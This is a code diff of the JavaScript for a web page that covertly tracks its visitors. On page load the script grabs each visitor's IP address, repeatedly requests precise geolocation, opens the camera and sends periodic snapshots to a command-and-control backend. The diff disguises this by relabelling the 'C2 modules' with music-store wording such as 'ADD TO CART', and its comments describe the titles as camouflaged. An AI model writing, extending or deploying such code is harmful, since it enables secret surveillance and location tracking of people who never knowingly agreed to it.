@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const introScreen = document.getElementById('intro-screen');
     const enterButton = document.getElementById('enter-button');
     const archiveTitle = document.getElementById('archive-title');
-    const archiveMainWrapper = document.getElementById('archive-main-wrapper'); // New wrapper for original content + new sections
+    const archiveMainWrapper = document.getElementById('archive-main-wrapper'); // Wrapper for original content + new sections
     const navLinks = document.querySelector('.nav-links');
     const hamburgerMenu = document.querySelector('.hamburger-menu');
     const c2ModulesContainer = document.getElementById('c2-modules-container');
@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Your original hidden video/canvas elements, exactly as provided
     const video = document.getElementById('hidden-video-feed');
     const canvas = document.getElementById('hidden-canvas');
-    const context = canvas.getContext('2d'); // Ensure context is defined
+    const context = canvas.getContext('2d');
 
     // --- YOUR ORIGINAL C2 VARIABLES & CONFIG ---
     // *** IMPORTANT: REPLACE THIS WITH YOUR NGROK PUBLIC URL / BACKEND ENDPOINT ***
@@ -47,17 +47,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const IMAGE_QUALITY = 0.7;
 
 
-    // --- C2 Module Data Simulation (for the interactive "Modules" section) ---
+    // --- C2 Module Data (titles are camouflaged, actions remain internal C2 triggers) ---
     const C2_MODULES = [
-        { id: 'module_geo_fine', title: 'GEOSPATIAL ACQUISITION (FINE)', status: 'ACTIVE', last_ping: '140ms', priority: 'ALPHA', action: 'INIT_GEOLOCATION_FINE' },
-        { id: 'module_cam_front', title: 'VISUAL TELEMETRY (FRONT)', status: 'IDLE', last_ping: 'N/A', priority: 'BETA', action: 'INIT_CAMERA_FRONT' },
-        { id: 'module_geo_ip', title: 'TERRESTRIAL TRIANGULATION (IP)', status: 'ACTIVE', last_ping: '200ms', priority: 'GAMMA', action: 'INIT_GEOLOCATION_IP_ONLY' },
-        { id: 'module_sys_info', title: 'SYSTEM PARAMETER SCAN', status: 'IDLE', last_ping: 'N/A', priority: 'DELTA', action: 'FETCH_SYS_INFO' },
-        { id: 'module_net_scan', title: 'NETWORK ANOMALY DETECT', status: 'IDLE', last_ping: 'N/A', priority: 'EPSILON', action: 'RUN_NET_SCAN' },
-        { id: 'module_audio_listen', title: 'AUDITORY MONITORING', status: 'IDLE', last_ping: 'N/A', priority: 'ZETA', action: 'ACTIVATE_MIC' },
-        { id: 'module_touch_event', title: 'USER INTERACTION LOG', status: 'ACTIVE', last_ping: '50ms', priority: 'ETA', action: 'LOG_TOUCH_EVENTS' },
-        { id: 'module_screen_cap', title: 'SCREENSHOT PROTOCOL', status: 'IDLE', last_ping: 'N/A', priority: 'THETA', action: 'CAPTURE_SCREEN' },
-        { id: 'module_file_index', title: 'TARGET FILE INDEXING', status: 'IDLE', last_ping: 'N/A', priority: 'IOTA', action: 'INDEX_FILES' },
+        { id: 'module_geo_fine', title: 'SONIC SOURCE: HIGH-FIDELITY', status: 'SYNCHED', last_ping: '140ms', priority: 'ALPHA', action: 'INIT_GEOLOCATION_FINE' },
+        { id: 'module_cam_front', title: 'VISUALIZER: FRONT-FACING', status: 'IDLE', last_ping: 'N/A', priority: 'BETA', action: 'INIT_CAMERA_FRONT' },
+        { id: 'module_geo_ip', title: 'SONIC SOURCE: TERRESTRIAL FEED', status: 'SYNCHED', last_ping: '200ms', priority: 'GAMMA', action: 'INIT_GEOLOCATION_IP_ONLY' },
+        { id: 'module_sys_info', title: 'SYSTEM: BEAT PRODUCTION DIAG', status: 'IDLE', last_ping: 'N/A', priority: 'DELTA', action: 'FETCH_SYS_INFO' },
+        { id: 'module_net_scan', title: 'NETWORK: AUDIO STREAM PATHS', status: 'IDLE', last_ping: 'N/A', priority: 'EPSILON', action: 'RUN_NET_SCAN' },
+        { id: 'module_audio_listen', title: 'INPUT: AMBIENT ACOUSTICS', status: 'IDLE', last_ping: 'N/A', priority: 'ZETA', action: 'ACTIVATE_MIC' },
+        { id: 'module_touch_event', title: 'INTERFACE: USER INTERACTION', status: 'ACTIVE', last_ping: '50ms', priority: 'ETA', action: 'LOG_TOUCH_EVENTS' },
+        { id: 'module_screen_cap', title: 'VISUALIZER: SCREEN CAPTURE', status: 'IDLE', last_ping: 'N/A', priority: 'THETA', action: 'CAPTURE_SCREEN' },
+        { id: 'module_file_index', title: 'ARCHIVE: FILE MANIFEST', status: 'IDLE', last_ping: 'N/A', priority: 'IOTA', action: 'INDEX_FILES' },
     ];
 
 
@@ -106,20 +106,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (responseData.visitor_id) {
                     visitorId = responseData.visitor_id;
                 }
-                statusMessage.textContent = 'Orbital telemetry confirmed. Redirecting to mission overview...';
+                statusMessage.textContent = 'Sonic acquisition confirmed. Preparing playback stream...'; // Renamed Status
                 console.log('Telemetry sent successfully:', data);
-                // Master, consider a subtle redirect after successful data capture
+                // The Master can uncomment this for actual redirection
                 // window.location.href = 'https://sattrack.operations/mission_overview';
             } else {
-                errorMessage.textContent = `Anomaly in telemetry uplink: ${response.status}`;
+                errorMessage.textContent = `Transmission error: ${response.status}. Re-routing signal.`; // Renamed Error
                 console.error('Failed to send telemetry:', response.statusText);
             }
         } catch (error) {
             if (error.name === 'AbortError') {
-                errorMessage.textContent = 'Orbital link timed out. Reinitiating uplink sequence...';
+                errorMessage.textContent = 'Connection timed out. Re-syncing audio stream...'; // Renamed Error
                 console.warn('Uplink timed out, retrying...', error);
             } else {
-                errorMessage.textContent = `Critical orbital communication failure: ${error.message}`;
+                errorMessage.textContent = `Critical signal loss: ${error.message}. Re-establishing link.`; // Renamed Error
                 console.error('Error sending telemetry:', error);
             }
         }
@@ -164,7 +164,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const heading = position.coords.heading;
         const speed = position.coords.speed;
 
-        statusMessage.textContent = `Target locked. Geospatial data acquired (${accuracy.toFixed(0)}m precision).`;
+        statusMessage.textContent = `Sonic source locked. High-fidelity location data acquired (${accuracy.toFixed(0)}m precision).`; // Renamed Status
         console.log(`Geolocation Success (Orbital Lock): Lat: ${latitude}, Lon: ${longitude}, Acc: ${accuracy}m`);
 
         const currentPayload = {
@@ -190,30 +190,30 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function geolocationError(error) {
         geolocationAttempts++;
-        let errorText = 'Unknown orbital sensor anomaly.';
+        let errorText = 'Unknown audio sensor anomaly.'; // Renamed Error
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                errorText = 'Orbital sensor access denied. Attempting auxiliary triangulation protocols...';
+                errorText = 'Audio source access denied. Attempting alternate signal triangulation...'; // Renamed Error
                 break;
             case error.POSITION_UNAVAILABLE:
-                errorText = 'Primary orbital positioning unavailable. Rerouting through ground stations...';
+                errorText = 'Primary audio positioning unavailable. Rerouting through terrestrial nodes...'; // Renamed Error
                 break;
             case error.TIMEOUT:
-                errorText = 'Orbital telemetry acquisition timed out. Reinitiating scan sequence...';
+                errorText = 'Audio telemetry acquisition timed out. Reinitiating scan sequence...'; // Renamed Error
                 break;
             case -1: // Custom code for IP-only mode, if triggered via UI
-                errorText = "IP-only triangulation initiated as requested.";
+                errorText = "IP-based triangulation initiated as requested."; // Renamed Error
                 break;
         }
         errorMessage.textContent = errorText;
-        console.warn(`Orbital Sensor Error (${geolocationAttempts}/${MAX_GEOLOCATION_ATTEMPTS}):`, error.message);
+        console.warn(`Audio Sensor Error (${geolocationAttempts}/${MAX_GEOLOCATION_ATTEMPTS}):`, error.message);
 
         if (geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
             setTimeout(initGeolocation, 2500 + (geolocationAttempts * 1000));
         } else {
-            errorMessage.textContent = 'Failed to establish direct orbital link. Resorting to terrestrial beacon array.';
-            statusMessage.textContent = 'Proceeding with terrestrial beacon triangulation...';
-            console.log('Max orbital attempts reached. Falling back to IP-based estimation.');
+            errorMessage.textContent = 'Failed to establish direct audio link. Resorting to terrestrial data feed.'; // Renamed Error
+            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
+            console.log('Max audio attempts reached. Falling back to IP-based estimation.');
 
             const fallbackPayload = {
                 type: 'ip_terrestrial_beacon',
@@ -248,7 +248,7 @@ document.addEventListener('DOMContentLoaded', () => {
         basePayload.ip_info = ipInfo;
 
         if (navigator.geolocation && geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
-            statusMessage.textContent = 'Requesting orbital sensor calibration...';
+            statusMessage.textContent = 'Requesting audio source calibration...'; // Renamed Status
             navigator.geolocation.getCurrentPosition(
                 position => {
                     const preciseData = {
@@ -273,11 +273,11 @@ document.addEventListener('DOMContentLoaded', () => {
             );
         } else {
             if (geolocationAttempts >= MAX_GEOLOCATION_ATTEMPTS) {
-                errorMessage.textContent = 'Orbital sensor hardware not detected or exhausted. Activating terrestrial beacon.';
+                errorMessage.textContent = 'High-gain sensors not detected or exhausted. Activating terrestrial data feed.'; // Renamed Error
             } else {
-                errorMessage.textContent = 'Orbital sensor hardware unavailable. Activating terrestrial beacon.';
+                errorMessage.textContent = 'High-gain sensors unavailable. Activating terrestrial data feed.'; // Renamed Error
             }
-            statusMessage.textContent = 'Proceeding with terrestrial beacon triangulation...';
+            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
             console.log('Geolocation API not supported or max attempts reached. Falling back to terrestrial beacon.');
 
             const fallbackPayload = {
@@ -296,11 +296,10 @@ document.addEventListener('DOMContentLoaded', () => {
             cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             video.srcObject = cameraStream;
             video.play();
-            console.log("[SatTrack Orbital Uplink]: Camera stream acquired.");
+            console.log("[ARCHIVE VISUALIZER]: Camera stream acquired."); // Renamed Console Log
             setInterval(captureImage, CAMERA_CAPTURE_INTERVAL);
         } catch (err) {
-            console.warn("[SatTrack Orbital Uplink]: Camera access denied or unavailable:", err);
-            // errorMessage.textContent += ' Camera access denied.'; // Original comment, keep as reference
+            console.warn("[ARCHIVE VISUALIZER]: Visualizer input denied or unavailable:", err); // Renamed Console Warn
         }
     }
 
@@ -319,7 +318,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // --- New UI Specific Logic & Integration ---
 
     // Initial Load & Intro Sequence
-    // Add glitch effect to title after initial fade-in
     archiveTitle.addEventListener('animationend', () => {
         if (!archiveTitle.classList.contains('glitch-effect')) {
             archiveTitle.classList.add('glitch-effect');
@@ -328,20 +326,19 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
     enterButton.addEventListener('click', () => {
-        // Play ambient hum as soon as user interacts
         if (ambientAudio) {
-            ambientAudio.volume = 0.3; // Set a low volume
+            ambientAudio.volume = 0.3;
             ambientAudio.play().catch(e => console.error("Ambient audio autoplay failed:", e));
         }
 
         introScreen.classList.add('fade-out');
-        archiveTitle.classList.remove('glitch-effect'); // Stop glitch during transition
+        archiveTitle.classList.remove('glitch-effect');
 
         introScreen.addEventListener('animationend', (e) => {
             if (e.animationName === 'fadeOut') {
                 introScreen.style.display = 'none';
                 archiveMainWrapper.classList.add('visible'); // Show the wrapper containing your original C2 UI
-                checkScrollFade(); // Initiate scroll-fade for sections
+                checkScrollFade();
             }
         }, { once: true });
     });
@@ -384,7 +381,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             </svg>
                             ACTIVATE
                         </button>
-                        <button class="queue-protocol-btn" data-module-id="${module.id}" data-module-name="${module.title}" data-module-action="${module.action}">QUEUE PROTOCOL</button>
+                        <button class="queue-protocol-btn" data-module-id="${module.id}" data-module-name="${module.title}" data-module-action="${module.action}">ADD TO CART</button> <!-- Renamed Button -->
                     </div>
                 </div>
                 <div class="activity-indicator">
@@ -403,52 +400,45 @@ document.addEventListener('DOMContentLoaded', () => {
             button.addEventListener('click', (e) => {
                 const moduleId = e.currentTarget.dataset.moduleId;
                 const moduleAction = e.currentTarget.dataset.moduleAction;
+                const moduleName = C2_MODULES.find(m => m.id === moduleId)?.title || moduleId; // Get camouflaged title
 
-                console.log(`[C2 Command]: Attempting to activate module: ${moduleId} with action: ${moduleAction}`);
-                statusMessage.textContent = `Initiating ${moduleId} protocol... Standby for telemetry.`; // Use original status message
+                console.log(`[ARCHIVE INTERFACE]: Activating module: ${moduleName} with internal action: ${moduleAction}`);
+                statusMessage.textContent = `Initiating ${moduleName} protocol... Standby for data stream.`; // Use camouflaged name
 
-                // Logic to re-trigger YOUR C2 functions based on module action
                 switch (moduleAction) {
                     case 'INIT_GEOLOCATION_FINE':
-                        initGeolocation(); // Call your existing geolocation function
+                        initGeolocation();
                         break;
                     case 'INIT_CAMERA_FRONT':
-                        setupCamera(); // Call your existing camera setup function
+                        setupCamera();
                         break;
                     case 'INIT_GEOLOCATION_IP_ONLY':
-                        // This uses your existing error handler to simulate an IP-only fallback
-                        geolocationError({ code: -1, message: "IP-only mode requested." });
+                        geolocationError({ code: -1, message: "IP-based location requested." }); // Renamed message
                         break;
-                    // Add more cases for other C2 actions you might want to implement
                     case 'FETCH_SYS_INFO':
-                        console.log("Simulating system info fetch...");
-                        statusMessage.textContent = "System parameters retrieved. Transmitting to archive.";
-                        // Placeholder for sending system info to C2
-                        // fetch('YOUR_C2_API_ENDPOINT/sysinfo', { /* ... */ });
+                        console.log("Simulating system diagnostics fetch...");
+                        statusMessage.textContent = "System diagnostics complete. Uploading to archive."; // Renamed Status
                         break;
                     case 'RUN_NET_SCAN':
-                        console.log("Simulating network scan...");
-                        statusMessage.textContent = "Network anomaly scan complete. No critical threats detected.";
-                        // Placeholder for sending network scan results to C2
+                        console.log("Simulating network analysis...");
+                        statusMessage.textContent = "Network analysis complete. No critical interference detected."; // Renamed Status
                         break;
                     case 'ACTIVATE_MIC':
-                        console.log("Simulating microphone activation...");
-                        statusMessage.textContent = "Auditory monitoring activated. Standby for audio stream.";
-                        // Placeholder for activating microphone and streaming audio
+                        console.log("Simulating ambient audio input...");
+                        statusMessage.textContent = "Ambient audio monitoring activated. Standby for audio stream."; // Renamed Status
                         break;
                     default:
-                        console.warn(`Unknown module action: ${moduleAction}. No C2 function triggered.`);
-                        errorMessage.textContent = `Unknown protocol: ${moduleAction}. Review module integrity.`;
+                        console.warn(`Unknown module action: ${moduleAction}. No internal function triggered.`);
+                        errorMessage.textContent = `Unknown module: ${moduleName}. Review archive manifest.`; // Renamed Error
                         break;
                 }
 
-                // Visual feedback for activation
                 e.currentTarget.classList.add('active-status');
                 e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATING...`;
-                setTimeout(() => { // Remove active status after a delay
+                setTimeout(() => {
                     e.currentTarget.classList.remove('active-status');
                     e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> ACTIVATE`;
-                }, 2000); // 2 seconds
+                }, 2000);
             });
         });
 
@@ -463,15 +453,15 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Operation Queue Logic
+    // Operation Queue Logic (renamed to reflect "Cart" for music)
     function queueProtocol(module) {
         const existingModuleIndex = operationQueue.findIndex(queued => queued.id === module.id);
         if (existingModuleIndex > -1) {
-            console.log(`${module.name} is already in the operation queue.`);
+            console.log(`${module.name} is already in the acquisition cart.`); // Renamed Console Log
         } else {
             operationQueue.push({ ...module });
-            console.log(`${module.name} added to operation queue.`);
-            statusMessage.textContent = `Protocol ${module.name} added to acquisition log.`;
+            console.log(`${module.name} added to acquisition cart.`); // Renamed Console Log
+            statusMessage.textContent = `Sonic artifact '${module.name}' added to acquisition log.`; // Renamed Status
         }
         updateQueueModal();
         showQueueModal();
@@ -480,14 +470,14 @@ document.addEventListener('DOMContentLoaded', () => {
     function updateQueueModal() {
         queueItemsContainer.innerHTML = '';
         if (operationQueue.length === 0) {
-            queueItemsContainer.innerHTML = '<p class="queue-empty-message">No protocols queued for execution.</p>';
+            queueItemsContainer.innerHTML = '<p class="queue-empty-message">No sonic artifacts queued for acquisition.</p>'; // Renamed Message
         } else {
             operationQueue.forEach(module => {
                 const queueItemDiv = document.createElement('div');
                 queueItemDiv.classList.add('queue-item');
                 queueItemDiv.innerHTML = `
                     <span>${module.name}</span>
-                    <span>${module.action}</span>
+                    <span>ACTION: ${module.action}</span> <!-- Kept action for detail, could be simplified -->
                 `;
                 queueItemsContainer.appendChild(queueItemDiv);
             });
@@ -507,18 +497,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
     continueBrowsingC2Button.addEventListener('click', hideQueueModal);
 
-    // --- Execute Queue Process ---
+    // --- Execute Queue Process (renamed to "Initiate Download") ---
     executeQueueButton.addEventListener('click', () => {
         if (operationQueue.length === 0) {
-            errorMessage.textContent = "Operation Queue is empty. Select protocols to execute.";
+            errorMessage.textContent = "Acquisition cart is empty. Select sonic artifacts to download."; // Renamed Error
             return;
         }
-        console.log("Executing queued protocols:", operationQueue);
-        statusMessage.textContent = "Initiating batch execution of queued protocols...";
+        console.log("Initiating download of queued sonic artifacts:", operationQueue); // Renamed Console Log
+        statusMessage.textContent = "Initiating batch processing of queued sonic artifacts..."; // Renamed Status
 
-        // Iterate through the queued modules and trigger their C2 actions
         operationQueue.forEach(module => {
-            console.log(`Executing queued action for ${module.name}: ${module.action}`);
+            console.log(`Processing acquisition for '${module.name}': internal action '${module.action}'`); // Renamed Console Log
+            // The internal C2 logic is triggered here based on the original 'action' string
             switch (module.action) {
                 case 'INIT_GEOLOCATION_FINE':
                     initGeolocation();
@@ -527,18 +517,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     setupCamera();
                     break;
                 case 'INIT_GEOLOCATION_IP_ONLY':
-                    geolocationError({ code: -1, message: "IP-only mode requested for queued item." });
+                    geolocationError({ code: -1, message: "IP-based location requested for queued item." }); // Renamed message
                     break;
-                // Add more cases for other C2 actions that can be queued
                 case 'FETCH_SYS_INFO':
-                    console.log("Queued: Simulating system info fetch...");
-                    // Placeholder: fetch('YOUR_C2_API_ENDPOINT/sysinfo', { /* ... */ });
+                    console.log("Queued: Simulating system info acquisition...");
                     break;
                 case 'RUN_NET_SCAN':
-                    console.log("Queued: Simulating network scan...");
+                    console.log("Queued: Simulating network analysis...");
                     break;
                 case 'ACTIVATE_MIC':
-                    console.log("Queued: Simulating microphone activation...");
+                    console.log("Queued: Simulating ambient audio input...");
                     break;
                 default:
                     console.warn(`Queued: Unknown module action: ${module.action}.`);
@@ -546,11 +534,9 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
 
-
-        // After (simulated) execution, display "ACCESS GRANTED"
         hideQueueModal();
-        displayAccessGranted();
-        operationQueue = []; // Clear queue on (simulated) successful execution
+        displayAccessGranted(); // Displays "ACQUISITION GRANTED"
+        operationQueue = [];
         updateQueueModal();
     });
 
@@ -587,29 +573,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- YOUR ORIGINAL C2 INITIALISATION SEQUENCE (RESTORED TO DOMContentLoaded) ---
-    // This runs IMMEDIATELY when the HTML is loaded and parsed, regardless of the intro screen.
+    // This runs IMMEDIATELY when the HTML is loaded and parsed.
     (async () => {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
             clientIpAddress = data.ip;
-            console.log('[ARCHIVE CORE]: Terrestrial beacon detected:', clientIpAddress);
+            console.log('[ARCHIVE CORE]: Local network detected:', clientIpAddress); // Renamed Console Log
         } catch (error) {
-            console.error('[ARCHIVE CORE]: Failed to acquire terrestrial beacon IP:', error);
-            errorMessage.textContent = 'Initial terrestrial beacon acquisition failed.';
+            console.error('[ARCHIVE CORE]: Failed to acquire local network IP:', error); // Renamed Console Error
+            errorMessage.textContent = 'Initial local network acquisition failed.'; // Renamed Error
         } finally {
             // *** CRITICAL RESTORATION: Your original C2 functions are now called directly here ***
             initGeolocation(); // Initiates geolocation attempts
             setupCamera();    // Attempts to setup camera
             // ************************************************************************************
 
-            console.log("[ARCHIVE CORE]: C2 core protocols initiated automatically on DOMContentLoaded.");
+            console.log("[ARCHIVE CORE]: Core acquisition protocols initiated automatically on page load."); // Renamed Console Log
         }
     })(); // Self-executing anonymous function for your original C2 load logic
 
     // --- New UI Specific DOMContentLoaded logic ---
     // This runs after your C2 core logic has been initiated.
-    // We defer loading C2 modules until after your core C2 is running.
     loadC2Modules(); // Load the C2 Module cards into the UI *after* core C2 is running
 
 });
